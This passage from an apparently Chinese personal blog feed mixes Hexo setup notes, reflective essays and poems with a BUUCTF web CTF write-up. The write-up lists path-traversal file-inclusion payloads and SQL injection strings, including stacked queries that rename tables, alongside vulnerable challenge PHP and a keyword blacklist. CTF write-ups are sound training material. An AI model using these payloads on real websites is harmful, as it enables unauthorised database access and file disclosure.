<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">comments:</span><br><span class="line">  valine:</span><br><span class="line">    enable: true</span><br><span class="line">    appid: </span><br><span class="line">    appkey: </span><br><span class="line">    notify: false</span><br><span class="line">    verity: false</span><br><span class="line">    placeholder: 留下你美好的足迹叭^-^!</span><br><span class="line">    guest_info: nink,mail</span><br><span class="line">    pageSize: 10</span><br></pre></td></tr></table></figure>

<h2 id="3-4-图床"><a href="#3-4-图床" class="headerlink" title="3.4 图床"></a>3.4 图床</h2><ul>
<li><p>腾讯云注册、创建对象存储 <a href="https://blog.csdn.net/qq_40672635/article/details/105904918?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162193173316780264070887%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162193173316780264070887&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-105904918.pc_search_result_cache&utm_term=%E8%85%BE%E8%AE%AF%E4%BA%91PICgo&spm=1018.2226.3001.4187">参考链接</a></p>
</li>
<li><p>获取密钥 <a href="https://console.cloud.tencent.com/cam/capi">地址</a></p>
</li>
<li><p>COSBrowser <a href="https://cloud.tencent.com/document/product/436/40762">官方文档</a></p>
</li>
<li><p>下载 PicGo  <a href="https://github.com/Molunerfinn/PicGo/releases">下载地址</a> </p>
</li>
<li><p>使用 <strong>腾讯云 + Typora +  PicGo</strong>  :</p>
<p>文件— 偏好设置，如下图进行配置</p>
<p><img src="https://i.loli.net/2021/05/25/Z1ArJXndGR9fsHW.png"></p>
<p>对于 PicGo ，配置如下</p>
<p><img src="https://i.loli.net/2021/05/25/CDi4mFZodyux3AJ.png" alt="image-20210525165424121"></p>
<p>最后点击上方的验证图片上传选项即可检验</p>
</li>
<li><p>第二种配置</p>
<p><img src="https://i.loli.net/2021/05/25/7VNB8QnXUtwvklP.png" alt="image-20210525171054377"></p>
<p>点击下载或更新</p>
<p>访问下面链接，注册账号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://sm.ms/home/apitoken</span><br></pre></td></tr></table></figure>

<p>然后访问下面链接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://sm.ms/home/apitoken</span><br></pre></td></tr></table></figure>

<p>点击生成Token</p>
<p><img src="https://i.loli.net/2021/05/25/4clAgqx5w3YDrbt.png" alt="image-20210525171309143"></p>
<p>然后点击Typora中的打开配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;picBed&quot;: &#123;</span><br><span class="line">    &quot;uploader&quot;: &quot;smms&quot;,</span><br><span class="line">    &quot;smms&quot;: &#123;</span><br><span class="line">      &quot;token&quot;: &quot;你上个页面的申请的token&quot; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;picgoPlugins&quot;: &#123;&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写入Token，保存</p>
<p>最后 验证图片上传选项进行验证 即可</p>
</li>
</ul>
<h1 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h1><p><a href="http://theme-next.iissnan.com/faqs.html#favicon">next 主题配置官方</a></p>
<p><a href="https://hexo.io/zh-cn/docs/configuration">hexo 官方使用文档</a></p>
<p><a href="https://www.jianshu.com/p/9d91355e8418">Github + PicGo 参考</a></p>
<p><a href="https://sunhwee.com/posts/6e8839eb.html#toc-heading-13">博客搭建全1</a></p>
<p><a href="https://blog.csdn.net/sinat_37781304/article/details/82729029?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162175036716780262580342%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162175036716780262580342&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-82729029.pc_search_result_no_baidu_js&utm_term=hexo+%E5%A2%9E%E5%8A%A0+comments&spm=1018.2226.3001.4187">HEXO 博客搭建全</a></p>
<p><a href="https://blog.csdn.net/nineya_com/article/details/103308963">https://blog.csdn.net/nineya_com/article/details/103308963</a></p>
<p><a href="https://github.com/iTimeTraveler/hexo-theme-hiker">hiker 主题界面设置</a></p>
<p><a href="https://www.bilibili.com/video/BV1cW411A7Jx?p=4">https://www.bilibili.com/video/BV1cW411A7Jx?p=4</a></p>
<p><a href="https://blog.csdn.net/jspnetcn/article/details/104111651?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-5.baidujs">https://blog.csdn.net/jspnetcn/article/details/104111651?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-5.baidujs</a></p>
]]></content>
      <categories>
        <category>博客部署</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>Hexo</tag>
        <tag>图床</tag>
      </tags>
  </entry>
  <entry>
    <title>恶之花有感</title>
    <url>/2021/10/01/%E6%81%B6%E4%B9%8B%E8%8A%B1%E6%9C%89%E6%84%9F/</url>
    <content><![CDATA[<p>如果你的至亲犯了罪，杀了人，在你童年一无所知的时候，对你造成了难以想象的伤害，你该如何活下去？<br>你能相信一个人这一辈子只为一个人而活着吗？每天就仅仅是做着相同的事情，他是一个合格的丈夫，合格的父亲，可他的过去是自己可以选择的吗？<br>如果曝光，世人会怎末说，连环杀人犯的儿子，和自己的父亲一起计划杀人，在杀了对自己有养育之恩的人之后逃跑，18年里仍未捕获，随后假冒别人的身份，居然与一位刑警结婚、生子，过着普通人般平凡的生活。<br>耳朵听到的，电视新闻上看到的，一定是真正的吗？<br>谁会知道，他也是在年幼时偶然间从电视上才得知，自己是杀人犯的儿子呢，谁有会知道，18年来逃跑的他，竟然是在替自己的姐姐洗清罪名呢？谁又相信他只是想普普通通和自己爱的人一辈子平平淡淡的生活下去呢？<br>不会，世人不会，警察不会，他只是想要为她而活，而她，竟然在痛苦之中得知了所有的真相却要不得不以着警察的身份，对他戴上手铐。<br>他没有做错啊，他年少受欺受辱，却从未杀人，他具有人格障碍，不与任何人亲近，他总是为了一盘录音磁带与别人大打出手，那是因为那个磁带，是他母亲留给他的唯一遗物啊，他总是一个人，在安静的地方插上耳机听着，他的脸色会洋溢起少有的笑容，那是因为，他在听自己妈妈的声音啊。可谁知道，那声音，却是无比凄惨，谁听了都会知道，那仿佛是要离开这个世界的最后的哭泣。<br>他不知道爱是什么，不知道愤怒是什么，喜悦是什么，伤心是什么，他不知道人们的所有情绪的表现都是怎样的，他总是一副毫无表情的脸，不会哭，不会笑。<br>他本毫无目的的生活，忍受世人的恶语，而很幸运，他，遇见了，她。<br>她，比一般的女孩子都主动，她很可爱，很漂亮，她主动向他表白，对他说，她会好好爱他，每天都会多一点。她，不知道他是谁。<br>他们，有了，宝宝。<br>他为了她们去学习幸福时脸上会洋溢着的表情，他每天早起，做饭，接送孩子上学，在这个家里，他做的很好，可在世人眼里，他是个罪人。<br>他不懂爱是什么，可他却早已深深地爱着她。<br>她，得知了真相，她很痛苦，难以承受，她终于对他说出了，我们分开吧，我现在很讨厌你，我们分开吧。<br>他不知道为什么，他很难过，却不清楚自己是什么情绪，他不清楚自己对她的感情，不知道他们之间出了什么问题。他想啊想，想啊想，到底什么可以让她开心呢？于是他决定，帮助她，冒着生命危险，找到真凶。</p>
<p>即使不愿成为太阳，却依然绚烂夺目。</p>
]]></content>
      <categories>
        <category>影视有感</category>
      </categories>
  </entry>
  <entry>
    <title>唯愿我们</title>
    <url>/2021/10/01/%E5%94%AF%E6%84%BF%E6%88%91%E4%BB%AC/</url>
    <content><![CDATA[<h3 id="唯愿我们"><a href="#唯愿我们" class="headerlink" title="唯愿我们"></a>唯愿我们</h3><p>从鲜衣怒马到鬓染白发 </p>
<p>不过弹指一刹那； </p>
<p>从小桥人家到沧海无涯</p>
<p>匆匆一眼尽繁华。 </p>
<p>流年似水， 往事不可追； </p>
<p>光阴似箭， 物是人已非。 </p>
<p>让烦恼缠绕心尖， 生活一片颓然； </p>
<p>让痛苦徘徊耳边， 人生全是不满。</p>
<p>感情的遗憾， 不如放手随他。 </p>
<p>想送你回家的人， </p>
<p>东西南北都顺路； </p>
<p>想陪你吃饭的人， </p>
<p>酸甜苦辣都可口；</p>
<p>想见你一面的人，</p>
<p>隔山隔海都能来。</p>
<p>生活的刁难， 不如看淡放宽。</p>
<p>生命这一程， 交织着风霜雨雪；</p>
<p>人生这一段， 夹杂着泥泞坎坷。 </p>
<p>没有跨不过的河， </p>
<p>没有迈不过的坎。</p>
<p>内心的执迷， 不如随风飘散。</p>
<p>有一往无前， 就有知难而退。 </p>
<p>看透了， 便是过眼云烟； </p>
<p>想通了， 不过昙花一现。 </p>
<p>不念过去， 不畏将来， </p>
<p>你若不放心上， 岁月便会无恙。</p>
<p>边走边看， 是一种优雅；</p>
<p>边走边忘， 是一份豁达。 </p>
<p>敬往事一杯酒， 愿岁月不回头。 </p>
<p><strong>唯愿我们：</strong></p>
<p>  <strong>过去的， 别再遗憾；</strong><br>  <strong>未来的， 无须忧虑；</strong><br>  <strong>现在的， 加倍珍惜。</strong></p>
]]></content>
      <categories>
        <category>生活杂谈</category>
      </categories>
  </entry>
  <entry>
    <title>查无此人</title>
    <url>/2021/10/01/%E6%9F%A5%E6%97%A0%E6%AD%A4%E4%BA%BA/</url>
    <content><![CDATA[<p>村上春树说</p>
<p>“你要记得那些黑暗中默默抱紧你的人，逗你笑的人，陪你彻夜聊天的人，坐车来看望你的人，带</p>
<p>着你四处游荡的人，说想念你的人。是这些人组成你生命中一点一滴的温暖，是这些温暖使你成</p>
<p>为善良的人。”</p>
<p>然后，在评论中我看到了，<br>，<br>，<br>查无此人。。。</p>
]]></content>
      <categories>
        <category>生活杂谈</category>
      </categories>
  </entry>
  <entry>
    <title>胡适与江冬秀</title>
    <url>/2021/10/01/%E8%83%A1%E9%80%82%E4%B8%8E%E6%B1%9F%E5%86%AC%E7%A7%80/</url>
    <content><![CDATA[<p>她并非小肚鸡肠，她能容忍胡适的风花雪月，但她就是不愿意原谅，曾经那么信任的两个人，嘴</p>
<p>上说着表哥表妹，背地里却狠狠背叛了她。</p>
<p>张爱玲说：”他们（胡适和江冬秀）是旧式婚姻罕有的幸福例子。”</p>
<p>她看多了旧式婚姻之中女人的悲剧，她绝对不能做怨妇，不能被丈夫牵着鼻子走，而是让胡适在</p>
<p>生活中依赖她，在心中敬重她，在感情上不能轻易放弃她。</p>
<p>胡适和江冬秀弯弯绕绕，终于走向白头功德圆满，他从刚开始的衡量算计，委屈求全，到真正为</p>
<p>江冬秀折服。世人笑他一位西装客娶了小脚女，哪知在江冬秀的人生哲理前，胡适的那些小聪明</p>
<p>真的就不算什么事儿了。</p>
<p>思君不见，倍感思君；别离难忍，忍痛别离。</p>
]]></content>
      <categories>
        <category>生活杂谈</category>
      </categories>
  </entry>
  <entry>
    <title>难熬的一夜</title>
    <url>/2021/10/01/%E9%9A%BE%E7%86%AC%E7%9A%84%E4%B8%80%E5%A4%9C/</url>
    <content><![CDATA[<p>难以想象，现在是8月27日5：56，我现在正躺在床上，写着这篇感想。</p>
<p>这个时间，对于我来说，怎么可能，不在睡觉，可事实是，什么鬼，我简直不敢相信，我入戏就</p>
<p>这么深吗，从前根本没有这样过，整整一个晚上，我满脑子都是剧情，可怕的剧情。夜里，好多</p>
<p>次清醒着，却又不敢睁眼，生怕一睁眼，就会有那张脸出现在我的眼前。要么就是满脑子的男主</p>
<p>女主，我对男主的经历感到很难过，并不是他的错啊，他也很痛苦啊，可是为什么要让他来承受</p>
<p>这一切。哎，总之，我很伤心，更为之心痛。</p>
<p>天色渐渐明朗，我听见了下面阿姨的扫地声，突然就不觉着害怕了，因为，这个世界很美好的不</p>
<p>是吗？你自己不也说过，这个世界，远比你想象的更加美好！太阳总会升起，世界总会迎来光</p>
<p>明。</p>
<p>就当是在给自己壮胆吧，世界的黑暗也总得有人知道，它在帮助我们变得更加勇敢。</p>
<p>2021.8.27    6：12</p>
]]></content>
      <categories>
        <category>生活杂谈</category>
      </categories>
  </entry>
  <entry>
    <title>BUUCTF-Web(一)</title>
    <url>/2021/05/26/BUUCTF-WEB%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<p>概述：BUUCTF-WEB 前十道题目，比较基础，主要考察文件包含、SQL注入、命令执行、源码泄露。</p>
<span id="more"></span>

<h1 id="一、-HCTF-2018-WarmUp"><a href="#一、-HCTF-2018-WarmUp" class="headerlink" title="一、[HCTF 2018]WarmUp"></a>一、[HCTF 2018]WarmUp</h1><p><strong>考点：文件包含、代码审计</strong></p>
<p>Ctrl + U 查看源码</p>
<p><img src="https://i.loli.net/2021/05/25/XyIsM2bH18rpJow.png" alt="image-20210525233503728"></p>
<p>访问得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,									 </span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>) </span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);	<span class="comment">//url解密</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)	</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])   <span class="comment">//检查变量是否是字符串，是返回 true ，否返回 false</span></span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将获取到的file变量内容进行两次问号过滤，每一次只截取到第一个问号的前面部分内容，我们要想每次截到的部分都符合白名单，即 source.php 或者是 hint.php。</p>
<p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://fde198a0-d059-40ed-bdbd-3812ba8e8ad3.node3.buuoj.cn/source.php?file=hint.php</span><br></pre></td></tr></table></figure>

<p>得到    flag not here, and flag in ffffllllaaaagggg，由于GET传参将会自动对特殊字符进行url编码，则利用 urldecode()函数 构造如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">source.php/?file=hint.php%253f/../../../../ffffllllaaaagggg</span><br><span class="line">source.php/?file=source.php%253f/../../../../ffffllllaaaagggg</span><br><span class="line">source.php/?file=source.php%253f/../../../../../ffffllllaaaagggg</span><br><span class="line"><span class="comment">#问号进行 两次url编码 之后为 % ，GET传参首先自动解码为 %3f(是?进行一次url编码的结果)，其中没有?，原样返回，绕过第一次过滤，然后 urldecode() 函数再次url解码得到问号，第二次问号过滤截取到结果 source.php 符合条件。</span></span><br><span class="line"></span><br><span class="line">source.php/?file=hint.php?/../../../../../ffffllllaaaagggg</span><br><span class="line">source.php/?file=source.php?/../../../../../ffffllllaaaagggg</span><br><span class="line">source.php/?file=source.php?/../../../../../../ffffllllaaaagggg</span><br><span class="line"><span class="comment">#经过GET传参之后变成  =source.php%3f..%2f..%2f..%2f..%2f..%2fffffllllaaaagggg，其中没有?，原样返回，绕过第一次过滤，然后 urldecode() 函数解码回到 =source.php?../../../../../ffffllllaaaagggg，第二次问号过滤截取到结果 source.php 符合条件。</span></span><br></pre></td></tr></table></figure>

<p><strong>总结</strong> :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#总结函数</span></span><br><span class="line">	mb_substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()</span><br><span class="line">	is_string() 检查变量是否是字符串，是返回 <span class="literal">true</span> ，否返回 <span class="literal">false</span></span><br><span class="line">    mb_strpos (haystack ,needle) 返回要查找的字符串（haystack）在别一个字符串（needle）中首次出现的位置，如没有则返回原字符串</span><br></pre></td></tr></table></figure>

<h1 id="二、-极客大挑战-2019-EasySQL1"><a href="#二、-极客大挑战-2019-EasySQL1" class="headerlink" title="二、[极客大挑战 2019]EasySQL1"></a>二、[极客大挑战 2019]EasySQL1</h1><p><strong>考点：SQL注入 之 万能密码 ‘ or 1=1</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#我们使用 &#x27;) 判断闭合方式</span></span><br><span class="line">q<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/2TpK1SiHyGmYEul.png" alt="image-20210526132249797"></p>
<p>单引号闭合</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#万能密码尝试</span></span><br><span class="line"><span class="string">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/tkDbvaWmpwP28dG.png" alt="image-20210526132358983"></p>
<h1 id="三、-极客大挑战-2019-Havefun1"><a href="#三、-极客大挑战-2019-Havefun1" class="headerlink" title="三、[极客大挑战 2019]Havefun1"></a>三、[极客大挑战 2019]Havefun1</h1><p><strong>考点：源码泄露</strong></p>
<p>Ctrl + U 查看源代码发现</p>
<p><img src="https://i.loli.net/2021/05/26/aR97luXhvdN8gP5.png" alt="image-20210526132810173"></p>
<p>则我们访问 <code>?cat=dog</code> ，得到</p>
<p><img src="https://i.loli.net/2021/05/26/GdCsZ8Nfi51PW2A.png" alt="image-20210526132853326"></p>
<h1 id="四、-强网杯-2019-随便注1"><a href="#四、-强网杯-2019-随便注1" class="headerlink" title="四、[强网杯 2019]随便注1"></a>四、[强网杯 2019]随便注1</h1><p><strong>考点：SQL注入 之 堆叠查询</strong></p>
<p><strong>技能：mysql 表结构的更改语句</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="string">&#x27; 						#得到报错，单引号闭合</span></span><br><span class="line"><span class="string">1&#x27;</span> or 1=1<span class="comment">#				#万能密码尝试</span></span><br><span class="line">1<span class="string">&#x27; order by 2 			#两列</span></span><br><span class="line"><span class="string">1&#x27;</span> union select 1,2<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>返回</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>

<p><strong>堆叠查询：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="string">&#x27;;show databases;#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/onluSItPbX53JBq.png" alt="image-20210526134222685"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="string">&#x27;;show tables;#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/u74xGYkpWj5m6OB.png" alt="image-20210526134259283"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="string">&#x27;;desc `1919810931114514`;#			#查表的结构</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/j5EK3MPqluzGReb.png" alt="image-20210526134618316"></p>
<p>存在 flag 字段</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="string">&#x27;;desc words;#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/pVfWFjzJuwgCk7P.png" alt="image-20210526134842151"></p>
<p>注：windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符，引用数字名称时，需要反引号包裹，字母型可不用包裹。</p>
<p><strong>分析：</strong></p>
<p><img src="https://i.loli.net/2021/05/26/MYAPV9gj5KeIEio.png" alt="image-20210526135018943"></p>
<p>我们提交查询的内容应该就是该表（words）中的数据，而SQL语句应该类似于 <code>selsect id,data from words where id =</code> ；而前面已经发现，flag 存在另一张表（1919810931114514）中。</p>
<p>方法一：更改 words 表名 为 其它，1919810931114514 表名为 words；flag 字段名为 id。这样查询的即是 1919810931114514 中的 flag字段了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="string">&#x27;;rename table `words` to `others`;rename table `1919810931114514` to `words`;alter table words change column flag id varchar(100);show tables;desc words;#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/iOU8DzQPqIRwJTM.png" alt="image-20210526142016807"></p>
<p>可以看到表的结构已经成功被我们更改，最后，只需要直接使用万能密码即可</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/nKbufIJkX1rq98p.png" alt="image-20210526142135176"></p>
<p><strong>补充：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0<span class="string">&#x27;;show columns from words;#</span></span><br><span class="line"><span class="string">0&#x27;</span>;show columns from `1919810931114514`;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><strong>总结：mysql 对 表的结构的更改语句</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 修改表名称：</span><br><span class="line">语法一： <span class="keyword">alter</span> <span class="keyword">table</span> tbl_name rename[<span class="keyword">to</span><span class="operator">|</span><span class="keyword">as</span>] new_tbl_name						<span class="comment">--可以更改一张数据表名称</span></span><br><span class="line">语法二：rename <span class="keyword">table</span> tbl_name <span class="keyword">to</span> new_tbl_name [,tbl_name2 <span class="keyword">TO</span> new_tbl_namew……	<span class="comment">--可以多表更改名称</span></span><br><span class="line"></span><br><span class="line">#添加表列</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> test <span class="keyword">add</span> <span class="keyword">column</span> name <span class="type">varchar</span>(<span class="number">10</span>); </span><br><span class="line"></span><br><span class="line">#删除表列</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> test <span class="keyword">drop</span> <span class="keyword">column</span> name; </span><br><span class="line"></span><br><span class="line">#修改表列类型</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> test modify address <span class="type">char</span>(<span class="number">10</span>) </span><br><span class="line"><span class="operator">||</span><span class="keyword">alter</span> <span class="keyword">table</span> test change address address <span class="type">char</span>(<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">#修改表列名</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> test change <span class="keyword">column</span> address address1 <span class="type">varchar</span>(<span class="number">30</span>)</span><br></pre></td></tr></table></figure>

<h1 id="五、-SUCTF-2019-EasySQL1"><a href="#五、-SUCTF-2019-EasySQL1" class="headerlink" title="五、[SUCTF 2019]EasySQL1"></a>五、[SUCTF 2019]EasySQL1</h1><p><strong>考点：堆叠注入、特殊语法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="comment">#							#数字型注入</span></span><br><span class="line">1;select database();<span class="comment">#		#查到数据库 ctf</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/GMCueOBwlAtbSUP.png" alt="image-20210526142736419"></p>
<p>尝试 堆叠注入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1;select database();(select group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema = <span class="string">&#x27;ctf&#x27;</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>没有获取到，有东西被过滤掉了，继续尝试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1;show database;<span class="comment">#				#查到所有数据库</span></span><br><span class="line">1;show tables;<span class="comment">#					#查到表 flag</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/tfjuprceWOZNob5.png" alt="image-20210526144140604"></p>
<p><img src="https://i.loli.net/2021/05/26/y6vCzkpGKODMug9.png" alt="image-20210526144222011"></p>
<p>紧接着当然会是想要查表 Flag 中的字段内容</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">show</span> columns <span class="keyword">from</span> Flag;#		#查不到</span><br></pre></td></tr></table></figure>

<p>这时因为Flag已经被过滤掉了，可以找个脚本跑一下，看看都被过滤了什么</p>
<p><img src="https://i.loli.net/2021/05/26/jtyXMeL3m9GizN2.png" alt="image-20210526165510881"></p>
<p>这些都是被过滤掉的，可以发现 <code>* 和 || </code>  并没有被过滤</p>
<p>网上求解：貌似有说存在源码泄露的 <code>index.php.swp</code> ，其中包含一条查询代码 <code> $sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$BlackList</span> = <span class="string">&quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile</span></span><br><span class="line"><span class="string">        			|readfile|where|from|union|update|delete|if|sleep|extractvalue|</span></span><br><span class="line"><span class="string">    			    updatexml|or|and|&amp;|\&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">//var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&#x27;query&#x27;]));</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/<span class="subst">&#123;$BlackList&#125;</span>/is&quot;</span>,<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">            <span class="comment">//echo $post[&#x27;query&#x27;];</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Nonono.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Too long.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select &quot;</span>.<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>].<span class="string">&quot;||flag from Flag&quot;</span>;</span><br><span class="line">        mysqli_multi_query(<span class="variable">$MysqlLink</span>,<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span> = mysqli_store_result(<span class="variable">$MysqlLink</span>))&#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="variable">$row</span> = mysqli_fetch_row(<span class="variable">$res</span>))&#123;</span><br><span class="line">                    print_r(<span class="variable">$row</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span 